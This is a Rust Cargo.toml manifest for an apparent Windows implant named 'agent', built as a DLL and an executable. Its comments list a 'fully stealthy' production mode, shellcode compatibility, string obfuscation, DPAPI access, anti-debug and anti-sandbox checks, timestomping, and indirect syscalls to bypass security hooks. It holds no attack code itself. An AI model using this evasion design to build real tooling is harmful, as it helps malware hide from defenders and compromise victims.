[package]
name = "agent"
version = "2.0.0"
edition = "2021"

[features]
default = ["dev"]
dev = []  # Development mode: console window + debug prints
production = []  # Production mode: no console, no debug prints, fully stealthy

[lib]
name = "agent_dll"
crate-type = ["cdylib"]
path = "src/lib.rs"

[[bin]]
name = "agent"
path = "src/main.rs"

[dependencies]
# Global allocator that works with shellcode (no TLS)
mimalloc = { version = "0.1", default-features = false }
# Ofuscación de strings en compile-time
obfstr = "0.4"
# TLS support - using ring backend instead of aws_lc_rs to avoid CMake/MSVC version issues
rustls = { version = "0.23", default-features = false, features = ["std", "tls12", "ring"] }
webpki-roots = "0.26"
# For global state (current directory)
lazy_static = "1.4"

[target.'cfg(windows)'.dependencies]
winapi = { version = "0.3", features = [
    "dpapi", 
    "wincrypt", 
    "errhandlingapi", 
    "libloaderapi", 
    "memoryapi", 
    "winnt",
    "minwindef",
    "ntdef",
    "processthreadsapi",  # Para GetCurrentProcess (syscalls)
    "debugapi",           # Para IsDebuggerPresent (anti-debug)
    "sysinfoapi",         # Para GetSystemInfo (anti-sandbox)
    "winsock2",           # Para TCP keepalive configuration
    "ws2def",             # Para socket definitions
    "handleapi",          # Para CloseHandle (timestomping)
    "fileapi"             # Para CreateFileW, SetFileTime (timestomping)
] }
# Indirect syscalls - dinvk provides DInvoke-style syscall execution
# Bypasses usermode hooks by dynamically resolving and executing syscalls
dinvk = "0.4"


[build-dependencies]
winres = "0.1.12"
